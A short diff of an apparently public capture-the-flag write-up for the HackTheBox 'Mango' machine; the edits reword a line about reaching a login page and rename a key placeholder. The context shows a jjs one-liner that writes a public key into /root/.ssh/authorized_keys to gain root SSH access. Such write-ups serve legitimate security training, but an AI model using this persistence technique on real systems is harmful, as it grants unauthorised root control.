@@ -21,7 +21,7 @@ By investigating the certificate we find some interesting info
   <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/HackTheBox/b2r/Mango/src/2.png" alt="1" />
 </p>
 
-Jumping to this address we found a login page
+We add this domain to our hosts file and by surfing to it we get a login page
 
 
 ### MongoDB
@@ -66,7 +66,7 @@ As [gtfobins](https://gtfobins.github.io/gtfobins/jjs/) suggests we basically ca
 ```
 $ echo 'var FileWriter = Java.type("java.io.FileWriter");
 var fw=new FileWriter("/root/.ssh/authorized_keys");
-fw.write("YOUR PUBLIC KEY");
+fw.write("PUBLIC KEY");
 fw.close();' | jjs
 ```
 
